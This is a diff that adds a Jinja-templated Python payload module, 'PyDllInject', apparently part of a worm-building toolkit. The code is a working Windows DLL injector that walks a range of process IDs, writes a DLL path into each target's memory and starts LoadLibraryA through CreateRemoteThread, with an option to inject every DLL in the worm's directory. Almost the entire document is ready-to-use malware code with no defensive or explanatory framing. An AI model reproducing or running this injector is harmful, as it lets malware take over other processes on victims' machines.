@@ -1,0 +1,103 @@
+#!name##PyDllInject
+#!types##payload
+#!info##A simple python script [W]. It checks each process PID in the given range and attempts to inject a DLL located in the same directory into the process.
+#!reqVar##PDI_dllname##Full name of the DLL file with extension to inject. Ex: mylib.dll##str
+#!reqVar##PDI_start_pid##The PID number from which the process search begins.##int
+#!reqVar##PDI_max_pid##Last PID number of the process.##int
+#!setVar##PDI_start_pid##800##int
+#!setVar##PDI_max_pid##11000##int
+#!reqVar##PDI_wait##Whether to use the 'WaitForSingleObject' function after starting the thread.##bool
+#!setVar##PDI_wait##False##bool
+#!reqVar##PDI_twait##Number of milliseconds for WaitForSingleObject function. Passing a value of '-1' means INFINITY##int
+#!setVar##PDI_twait##10##int
+#!reqVar##PDI_load_all##Placing an additional function that will load all DLLs in directory where worm is running. When using this option you don't need to specify the DLL file name.##bool
+#!setVar##PDI_load_all##False##bool
+#!reqVar##GLOBAL_NO_DLL##Whether the compiler should include libraries in the executable. Without the included DLLs, the resulting file takes up very little space.##str
+#!setVar##GLOBAL_NO_DLL##True##str
+#!import_FLAG##True
+#!render_FLAG##True
+
+
+import os
+import ctypes
+from ctypes import wintypes, byref
+
+PER = 0x00000040
+PAA = ( 0x000F0000 | 0x00100000 | 0xFFF )
+VIM  = ( 0x1000 | 0x2000 )
+
+HMODULE = wintypes.HMODULE
+LPCSTR = wintypes.LPCSTR
+LINT = wintypes.LARGE_INTEGER
+HANDLE = wintypes.HANDLE
+DWORD = wintypes.DWORD
+SIZE_T = ctypes.c_size_t
+LP_SIZE_T = ctypes.POINTER(SIZE_T)
+LPVOID = wintypes.LPVOID
+LPCVOID = wintypes.LPCVOID
+INT = wintypes.INT
+
+k32 = ctypes.windll.kernel32
+
+def close(handle):
+    k32.CloseHandle(handle)
+
+def inject(pid, fpath):
+    GM = k32.GetModuleHandleA
+    GM.argtypes = [LPCSTR]
+    GM.restype = HMODULE
+    GP = k32.GetProcAddress
+    GP.argtypes = [HMODULE, LPCSTR]
+    GP.restype = LPVOID
+    OP = k32.OpenProcess
+    OP.argtypes = [DWORD, DWORD, DWORD]
+    OP.restype = HANDLE
+    VAL = k32.VirtualAllocEx
+    VAL.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
+    VAL.restype = LPVOID
+    WM = k32.WriteProcessMemory
+    WM.argtypes = [HANDLE, LPVOID, LPCVOID, SIZE_T, LP_SIZE_T]
+    WM.restype = INT
+    TH = k32.CreateRemoteThread
+    TH.argtypes = [HANDLE, LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, DWORD]
+    TH.restype = INT
+
+    mod_name = LPCSTR(b"kernel32.dll")
+    module = GM(mod_name)
+    proc_name = LPCSTR(b"LoadLibraryA")
+    proc_addr = GP(module, proc_name)
+    if not proc_addr:
+        return
+    hproc = OP(PAA, 0, pid)
+    if hproc:
+        mem_addr = VAL(hproc, 0, len(fpath), VIM, PER)
+        if mem_addr:
+            bytes_wr = SIZE_T(0)
+            out = WM(hproc, mem_addr, fpath, len(fpath), byref(bytes_wr))
+            if out:
+                TH(hproc, 0, 0, proc_addr, mem_addr, 0, 0)
+                {% if PDI_wait %}
+                k32.WaitForSingleObject(hproc, {{PDI_twait}})
+                {%endif%}
+                close(hproc)
+                return True
+        close(hproc)
+    return False
+
+def work(fpath):
+    for p in range({{PDI_start_pid}}, {{PDI_max_pid + 1}}):
+        if inject(p, fpath):
+            break
+
+{% if PDI_load_all %}
+from threading import Thread
+for f in os.listdir(os.getcwd()):
+    if os.path.splitext(f)[1] == ".dll":
+        th = Thread(target=work, args=(os.path.join(os.getcwd(), f).encode(), ))
+        th.start()
+
+{%else%}
+work(os.path.join(os.getcwd(), "{{PDI_dllname}}").encode())
+{%endif%}
+
+
